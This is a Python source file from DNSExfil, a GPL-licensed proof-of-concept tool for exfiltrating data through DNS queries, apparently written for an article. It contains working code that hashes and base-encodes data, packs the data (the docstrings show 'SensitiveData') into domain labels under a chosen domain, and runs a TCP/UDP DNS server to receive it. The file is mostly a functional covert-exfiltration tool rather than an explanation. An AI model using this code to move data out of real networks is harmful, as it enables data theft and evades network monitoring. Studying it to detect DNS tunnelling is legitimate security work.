#!/usr/bin/python3
# -*- coding: utf-8 -*-
# DNSExfil - Exfiltrate data using DNS (PoC for DigitalWhisper.co.il).
# Copyright (C) 2021  Maor Gordon
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

import math
import random
import socket
import hashlib
import threading
from re import sub
from typing import Union, Optional, List, Tuple, Literal, Dict, Iterator, Callable
from functools import cached_property, singledispatchmethod

from .compression import *


class ID:
    """
    Class for handling the ID of messages.
    Every Message gets its own id based on the hash-based __mark__ function that decides how to digest it.
    Different messages should have different IDs. For the purpose of this project, the generated partial hash
    is usually sent in a domain name to validate the contents and handle fragmentation.

    Creating an ID object is as simple as any other object:
        >>> x = ID("Some really long data")
        >>> x
        ID('1d52')

    The ID object can help identify and verify the contents of the data in different cases.
    One case, for example, is the matter of verifiying fragmented data. In order to do so, the
    reconstructed data is being constantly checked against the ID. When it matches, the data
    has been successfully reconstructed.

    is_identical() is a function that returns True if the data matches the hash and False otherwise:
        >>> x = ID("LongData1")
        >>> x
        ID('c702')
        >>> x.is_identical("Other data")
        False
        >>> x.is_identical("LongData")
        False
        >>> x.is_identical("LongData1")
        True

    For those who might feel reluctant to use the above function to compare data to the saved hash,
    it is also possible to compare using a simple comparison::
        >>> ID("LongData") == "LongData"
        True
        >>> ID("LongData").is_identical("LongData")
        True

    To get a unique string representation of the data, based on the hash function, casting to str can be used::
        >>> x = ID("Hello World")
        >>> x
        ID('a591')
        >>> str(x)
        'a591'

    In cases where only the hash of the data is known, the creation of an ID object is still possible thanks to
    from_hash() static method. The hash given must be of the same algorithm as the __mark__ hash function::
        >>> x = ID("LongData")
        >>> x
        ID('277a')
        >>> y = ID.from_hash('277a') # using hexadecimal string representation of the hash
        >>> z = ID.from_hash(10106) # using decimal representation of the hash
        >>> y == x == z
        True


    REFRAIN FORM USING LONG HASHES! - using long hashes occupies more space that can otherwise be used for data
    characters, which increases the overall amount of data sent, and yields less-effective results. Hashes, in
    nature, are meant to be extremely volatile, which makes them perfect for this. although shorter hashes tend
    to be more susceptible to collisions, I've found that the first 2 bytes of a hash (65,535 options) is sufficiant.
    """

    ENCODING: str = "utf-8"

    def __init__(self, data: Union[bytes, str]):
        """
        constructs a new ID object.
        Digests the excerpt of the data with the defined __mark__ function and saves it.
        :param data: the data which this ID will later verify.
        :type data: Union[bytes, str]
        """
        if isinstance(data, str):
            data = data.encode(ID.ENCODING)
        self._mark: int = ID.__mark__(data)

    def is_identical(self, data: Union[bytes, str]):
        """
        The function to check whether the data received is identical to the data that was initially
        constructed in the ID object.
        :param data: test data to check if it matches the ID
        :type data: Union[bytes, str]
        :return: True if the hash of the data matches the ID, False otherwise
        :rtype: bool
        """
        return self == ID(data)

    def __eq__(self, other):
        if isinstance(other, ID):
            return self._mark == other._mark
        if isinstance(other, (str, bytes)):
            return self.is_identical(other)
        raise NotImplementedError(f"Unable to compare ID object with {str(type(other))}")

    def __hash__(self):
        return hash(self._mark)

    def __str__(self):
        return hex(self.mark)[2:]

    def __repr__(self):
        return f"ID('{str(self)}')"

    @singledispatchmethod
    @staticmethod
    def from_hash(id_hash: int):
        """
        Creates a new ID object with existing mark of a data (when the data is unknown but its hash is known). The
        hash function used to create the known hash must be identical to the hash function used in the __mark__
        method.
        :param id_hash: int of the hash result (i.e 6239 for hash '185f'), or a hexadecimal string (i.e '185f').
        :return: ID object
        """
        id_obj: ID = ID(b"")
        id_obj._mark = id_hash
        return id_obj

    @from_hash.register(str)
    @staticmethod
    def _(id_hash):
        id_obj = ID(b"")
        id_obj._mark = int(id_hash, 16)
        return id_obj

    @staticmethod
    def __mark__(data: bytes) -> int:
        """
        Hash-based function that defines how to process data and generate a number that uniquely defines the data.
        Identical data must produce identical results.

        the first 4 letters (two bytes) of a SHA256 to define and differentiate between the different
        incoming data.
        :param data: the data to generate an id from
        :type data: bytes
        :return: unique id number that defines the data
        :rtype: int
        """
        return int(hashlib.sha256(data).hexdigest()[:4], 16)

    mark = property(lambda self: self._mark)


class Alphabet:
    """
    The purpose of this object is to define a base in order to encode and decode data to a
    different base (and represent it accordingly). Essentially, using Alphabet one can
    convert any base to any base.

    The first character is used as padding character.

    As with any encoding process, the ability to differentiate between values is imperative. The process will fail if
    you include the same character more than once in the alphabet.

    For this scope, The letters used should correspond to IDNA2008, as standardized in RFC5891:
        1. Only contain alphanumeric characters (A-Z, a-z, 0-9) and a "-" (hyphen).
        2. Never start or end with a "-" (hyphen).
        2. Never contain two consecutive hyphens in the third and fourth character positions (reserved for
           Punycode encoding).

    Due to the multiple conditions tied to involving a "-" (hyphen) in the encoding, I find it better to advice
    against including it in an IDNA-based encoding schemes.

    Creating an Alphabet object and using it to encode and decode data is as simple as::
        >>> alph = Alphabet("ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz0123456789") #RFC4648
        >>> alph.encode("Th1s is Raw Data")
        b'HSeA63F7gkgKiaYLwzRhom'
        >>> alph.decode(b'HSeA63F7gkgKiaYLwzRhom')
        b'Th1s is Raw Data'

    It is also possible to create an Alphabet object by specifiying ranges of ASCII letters, using from_range() method::
        >>> alph1 = Alphabet("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789")
        >>> alph2 = Alphabet.from_range("A-Za-z0-9")
        >>> alph1 == alph2
        True

    If you'd like to add some "spice" to your encoding, you can use the randomization system that, for a given random
    seed, will shuffle the order of the alphabet characters and their numerical representation. the use of a random
    seed is highly recommended when randomizing for consistency of shuffeling between the client and the server (The
    same random seed value will always return the same order of characters)::
        >>> Alphabet.from_range("A-Za-z0-9")
        Alphabet(ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789)
        >>> Alphabet.from_range("A-Za-z0-9", random_order = True, random_seed = 314)
        Alphabet(7VC8asYe5hjmrFxytnE1bR9fKTqX2wlgUWJzvQkpBPGI6u3Dci0NZOS4oALHdM)

    """

    ENCODING: str = "utf-8"

    def __init__(self, alphabet_chars: Union[bytes, str], random_order: Optional[bool] = False,
                 random_seed: Optional[int] = None):
        """
        Creates a new Alphabet Object.

        :param alphabet_chars: sequence of all the characters involved in the base encoding.
        :type alphabet_chars: Union[bytes, str]
        :param random_order: Optional (Default=False). If set to True, the order of the elements in alphabet_chars
                        will be randomized according to the random_seed value.
        :type random_order: bool
        :param random_seed: Optional (Default=None). if set to a number (not None), it will use the number as
                        the random seed to shuffle the chars. identical seed values will shuffle the alphabet
                        chars identically.
        :type random_seed: int
        """

        self._chars_ = bytearray(alphabet_chars) if isinstance(alphabet_chars, bytes) else \
            bytearray(alphabet_chars, Alphabet.ENCODING)
        self._is_randomized_ = random_order
        self._random_seed_ = random_seed
        if len(set(self._chars_)) != len(self._chars_):
            _dups_ = list(bytes(set([i for i in self._chars_ if self._chars_.count(i) > 1]))
                          .decode(Alphabet.ENCODING))
            raise TypeError(f"The bytes {_dups_} appear more than once.")

        if random_order:
            if random_seed is not None and isinstance(random_seed, int):
                random.seed(random_seed)

            random.shuffle(self._chars_)

    @cached_property
    def is_randomized(self) -> bool:
        return self._is_randomized_

    @cached_property
    def random_seed(self) -> int:
        return self._random_seed_

    @property
    def chars(self) -> bytes:
        return bytes(self._chars_)

    @cached_property
    def base(self) -> int:
        return len(self.chars)

    def __str__(self):
        return self._chars_.decode(Alphabet.ENCODING)

    def __eq__(self, other):
        if isinstance(other, Alphabet):
            return str(self) == str(other)
        raise NotImplementedError(f'Unable to compare Alphabet object with {str(type(other))}')

    def __repr__(self):
        return f"Alphabet({self._chars_.decode(Alphabet.ENCODING)})"

    def decode(self, v: Union[bytes,str]) -> bytes:
        """
        Source: https://github.com/keis/base58
        Converts baseX-encoded bytes object to original message.
        The base is determined by the length of the alphabet parameter
        eg.:
            b"H91h8ETY" -> "hello"
        :param v: the encoded message
        :type v: bytes
        :return: the decoded message
        :rtype: bytes
        """
        v = v.rstrip()
        if isinstance(v, str):
            v = v.encode(Alphabet.ENCODING)
        origlen = len(v)
        v = v.lstrip(self._chars_[0:1])
        newlen = len(v)
        base = len(self._chars_)
        decoded = 0
        multi = 1
        v = v[::-1]
        for char in v:
            decoded += multi * self._chars_.index(char)
            multi *= base

        acc = decoded
        result = []
        while acc > 0:
            acc, mod = divmod(acc, 256)
            result.append(mod)

        return b'\0' * (origlen - newlen) + bytes(reversed(result))

    def encode(self, v) -> bytes:
        """
        Source: https://github.com/keis/base58
        Converts input text (as bytes object or str) to baseX (Depends on the length of the alphabet parameter).
        i.e:
            "hello" -> b"H91h8ETY"
        :param v: the message to encode
        :type v: Union[bytes, str]
        :return: the encoded message
        :rtype: bytes
        """
        if isinstance(v, str):
            v = v.encode(Alphabet.ENCODING)

        origlen = len(v)
        v = v.lstrip(b'\0')  # Removes nulls from left
        newlen = len(v)
        acc = int.from_bytes(v, byteorder='big')  # first byte is most significant
        result = b""
        base = len(self._chars_)
        while acc:
            acc, idx = divmod(acc, base)
            result = self._chars_[idx:idx + 1] + result
        return bytes(self._chars_[0:1] * (origlen - newlen) + result)

    @staticmethod
    def from_range(range_str: str, duplicate_fix: bool = False, **kwargs):
        """
        Creates (and returns) a new Alphabet object from a range-describing string.
        i.e:
            >>> Alphabet.from_range("a-z0-9")
            Alphabet(abcdefghijklmnopqrstuvwxyz0123456789)

        :param range_str: the range describing the alphabet
        :type range_str: str
        :param duplicate_fix: (Default=False) ignores duplicated characters if exists
        :type duplicate_fix: bool
        :param kwargs: other parameters that define a new Alphabet object
        :type kwargs:
        :return: Alphabet object of the unpacked string
        :rtype: Alphabet
        """

        def expand(r: str) -> str:
            if len(r[0]) != 3:
                raise ValueError(f"Error parsing {r[0]}")
            start = ord(r[0][0])
            end = ord(r[0][-1]) + 1
            return "".join([chr(i) for i in range(start, end)])

        # Expand Ranges
        expended = sub(r"[^\\]\-[^\\]", expand, range_str)

        if duplicate_fix:
            expended = "".join(
                [expended[i] for i in range(len(expended))
                 if expended[:i + 1].count(expended[i]) == 1]
            )
        return Alphabet(expended, **kwargs)


class DomainBuilder:
    """
    This class is meant for constructing the domain names with the desired data to be tunneled to the server using DNS.

    "RFC1035: DOMAIN NAMES - IMPLEMENTATION AND SPECIFICATION" defines the properties of a proper domain name:
        1.  The length of a single label (element of a domain name separated by [.]) can not exceed 63 octats.
        2.  The maximum length of a domain (including dots) is 253 octats.
        3.  The domain must contain alphanumeric characters (A-Z, a-z, 0-9) and a "-" (hyphen).

    creating a DomainBuilder object requires an Alphabet Character (used for encoding) and the main sub-domain through
    which the data will be tunneled::
        >>> alph = Alphabet.from_range("A-Za-z0-9")
        >>> builder = DomainBuilder(alph, "example.com")

        # adding information to an internal buffer (of type 'bytes'), before starting the building process
        >>> builder.add(b"SensitiveData1")
        >>> builder.add(" SensitiveData2 that is a string UwU")
        >>> builder.data
        b'SensitiveData1 SensitiveData2 that is a string UwU'

        # Build the domains and print them
        >>> for domain in builder.build_domains():
        ...     print(domain)
        JCUaPkhLuRCFe3cQ9DHT8K9N2hdhETZRG8pHZ4pFgX09atgqepUciwUqsTFqj9.ksJut.50.t-1.ce51.example.com

    It is also possible to compress the information pre-building it, using the compression
    argument in the constructor.

    """

    def __init__(self, alphabet: Alphabet, sub_domain: str = "", compression: Compression = None):
        self._alphabet_: Alphabet = alphabet
        self._sub_domain_: str = sub_domain
        self._data_: bytes = b""
        self._compression_: Compression = compression

    @property
    def alphabet(self) -> Alphabet:
        return self._alphabet_

    @property
    def compression(self) -> Compression:
        return self._compression_

    @property
    def data(self) -> bytes:
        return self._data_

    @singledispatchmethod
    def add(self, data: bytes):
        """
        function that adds data to be later built into a domain.
        :param data: the data to add in bytes or in str
        """
        self._data_ += data

    @add.register(str)
    def _(self, data: str):
        self._data_ += data.encode(self.alphabet.ENCODING)

    def _build_domain_labels_(self, message: bytes, current_subdomain: str = None) -> Tuple[List[str], bytes]:
        """
        Builds a proper domain name from a message (str) and returns it as well as leftovers that couldn't
        make it to the domain name generated.
        Returns two values: string of the domain name, and the remaining message.
        :param message: the message to send (no metter the length)
        :type message: bytes
        :param current_subdomain: the sub-domain through which the data is sent. if None, DomainBuilder's sub-domain
                                is used.
        :type current_subdomain: str
        :return: the domain labels.
        :rtype: (List[str], bytes)
        """

        if current_subdomain is not None:
            subdomain = current_subdomain
        else:
            subdomain = self._sub_domain_

        domain_data = subdomain.split(".")
        domain_len = len(".".join(domain_data))
        data_lables = []
        while message and domain_len < 250:
            target_b = min(63, 250 - domain_len)  # Number of encoded characters
            target_ascii = int(target_b * math.log(self.alphabet.base) / math.log(256))  # Number of data bytes

            add = self.alphabet.encode(message[:target_ascii]).decode("idna")
            message = message[target_ascii:]

            data_lables.append(add)
            domain_data.insert(0, add)
            domain_len = len(".".join(domain_data))
        return data_lables, (message if message else None)

    def build_domains(self, compresslevel: int = 9) -> Iterator[str]:
        """
        Converts a message to one or more full domains.
        :return: Generator of data-encoded domains.
        :rtype: Iterator[str]
        """

        if self._compression_ is not None:
            self._data_ = self._compression_.compress(self._data_, compresslevel)

        real_sub_domain = self._sub_domain_.split(".")
        message_length = len(self._data_)
        message_id = ID(self._data_)
        sub = [str(message_id)] + real_sub_domain
        index = 1
        while self._data_:
            current_sub = [str(message_length), str(index)] + sub
            domain, self._data_ = self._build_domain_labels_(self._data_, current_subdomain=".".join(current_sub))
            if not self._data_:
                yield ".".join(domain + [str(message_length), "t-1"] + sub)
            else:
                yield ".".join(domain + current_sub)
            index += 1


class ProtocolError(ValueError):
    """
    Exception that rises when the wrong "protocol" parameter is given when
    creating a new DNSServer instance (a protocol neither "TCP" or "UDP").
    """
    pass


class DNSServer(threading.Thread):
    """
    A class that serves as a TCP/UDP Multithreaded DNS server.

    Controlling the actions the server makes is both possible and easy
    thanks to on_incoming_data decorator. The decorated functions should
    contain two arguments -
        data (bytes): the incoming raw data
        addr (Tuple[str, int]): the address and port of the client sending the information
    whatever the function returns (as long as it's not None) will be sent back to the client
    as a response::

        >>> server = DNSServer() #Default is port 53, UDP

        >>> @server.on_incoming_data
        ... def new_data(d, addr):
        ...    print(f'Incoming from {addr}: {d}')
        ...    return "Sup" #'Sup' will be returned to the client

        >>> server.start() # Start listening for incoming queries (Seperate thread)
        server.join() # Wait endlessly

    This server can also be run on the main thread by using "run()" function.
    """
    _types: Dict[str, socket.SocketKind] = dict(UDP=socket.SOCK_DGRAM, TCP=socket.SOCK_STREAM)

    def __init__(self, host: str = "0.0.0.0", port: int = 53,
                 protocol: Literal["UDP", "TCP"] = "UDP", max_connections: int = 5,
                 thread_name: str = "Thread"):
        """
        Initializes instance of DNSServer.

        Although the default settings should be sufficient, some parameters can be modified.

        :param host: IP of the server (listening IP). Defaults to "0.0.0.0" (Listen to all incoming connections)
        :type host: str
        :param port: Port to listen in. Defaults to 53 (default DNS port)
        :type port: int
        :param protocol: the transport protocol to use (either "TCP" or "UDP"). Defaults to "UDP".
        :type protocol: str
        :param thread_name: Name of the thread (for debugging purposes)
        :type thread_name: str
        """
        threading.Thread.__init__(self)

        if not protocol.upper().strip() in self._types.keys():
            raise ProtocolError(f"Protocol {protocol} is not valid!")

        self.__host__: str = host
        self.__port__: int = port
        self.__socket_type__: socket.SocketKind = self._types[protocol.upper().strip()]
        self.name: str = thread_name

        self._func_: Callable = None

        self.__socket__: socket.socket = socket.socket(socket.AF_INET, self.__socket_type__)
        self.__socket__.bind((host, port))

        if protocol.upper().strip() == "TCP":
            self.__socket__.listen(max_connections)

    def on_incoming_data(self, func: Callable):
        self._func_ = func
        return lambda _: func()

    def __repr__(self):
        return f"DNSServer( {self.host}:{self.port} )"

    @property
    def host(self) -> str:
        return self.__host__

    @property
    def port(self) -> int:
        return self.__port__

    @property
    def socket_obj(self) -> socket.socket:
        return self.__socket__

    def __run_tcp__(self):
        while True:
            connection, client_address = self.__socket__.accept()
            data = connection.recv(4096)
            ans = self._func_(data, client_address)
            connection.sendall(ans)
            connection.close()

    def __run_udp__(self):
        while True:
            data, address = self.__socket__.recvfrom(4096)
            ans = self._func_(data, address)
            if isinstance(ans, str):
                ans = ans.encode("utf-8")
            self.__socket__.sendto(ans, address)

    def run(self):
        print(f"{self.name}: Listening on {self.host}:{self.port}...")
        run_types = {
            socket.SOCK_STREAM: self.__run_tcp__,
            socket.SOCK_DGRAM: self.__run_udp__,
        }
        # Run __run_tcp__ or __run_udp__
        run_types[self.__socket_type__]()
